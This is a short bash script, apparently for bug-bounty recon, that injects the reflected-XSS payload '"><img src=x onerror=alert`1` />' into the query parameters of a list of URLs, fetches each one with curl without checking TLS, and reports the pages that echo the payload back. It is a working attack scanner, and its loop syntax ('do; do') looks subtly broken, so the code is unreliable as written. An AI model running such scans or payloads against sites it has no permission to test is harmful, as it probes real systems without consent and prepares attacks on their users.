#!/bin/bash
urlsFile=$1
cat $urlsFile | qsreplace '"><img src=x onerror=alert`1` />' | while read host do; do curl --silent --insecure $host | grep -qs "<img src=x" && echo "[*] REFLECTION FOUND $host"; done 
